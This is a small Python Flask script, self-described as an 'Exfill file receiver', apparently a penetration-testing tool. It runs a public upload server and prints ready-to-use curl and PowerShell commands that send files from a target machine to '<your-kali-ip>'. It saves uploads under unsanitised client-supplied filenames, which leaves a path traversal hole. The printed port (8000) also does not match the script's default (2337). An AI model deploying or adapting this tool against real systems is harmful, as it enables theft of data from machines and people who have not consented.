from flask import Flask, request, jsonify
import os
import argparse

UPLOAD_FOLDER = './uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    filepath = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
    file.save(filepath)
    return jsonify({'status': 'success', 'filename': file.filename}), 200

if __name__ == '__main__':
    print('----')
    print('curl -F "file=@yourfile.txt" http://<your-kali-ip>:8000/upload')
    print('----')
    print('Invoke-RestMethod -Uri http://<your-kali-ip>:8000/upload -Method Post -Form @{file=Get-Item "C:\\path\\to\\file.txt"}')
    print('----')
    
    parser = argparse.ArgumentParser(description="Exfill file receiver via Flask.")
    parser.add_argument('--port', type=int, default=2337, help='Port to listen on (default: 2337)')
    args = parser.parse_args()

    app.run(host='0.0.0.0', port=args.port)
